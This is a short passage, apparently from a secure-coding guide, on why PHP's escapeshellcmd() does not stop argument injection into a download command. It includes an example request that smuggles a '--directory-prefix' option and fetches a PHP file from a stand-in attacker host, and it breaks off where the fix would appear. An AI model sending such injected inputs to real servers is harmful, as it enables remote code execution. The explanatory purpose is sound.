$url;
system(escapeshellcmd($command));
If the user provides:
http://victim.com/download.php?url=--directory-prefix=. http://attacker.com/malicious.php
escapeshellcmd() will still allow this extra parameter meaning the attacker can override the original --
directory-prefix option, save the file in the current directory and then achieve remote command execution on
the server.
The safe approach is to use escapeshellarg() so that the URL is treated as a single argument:
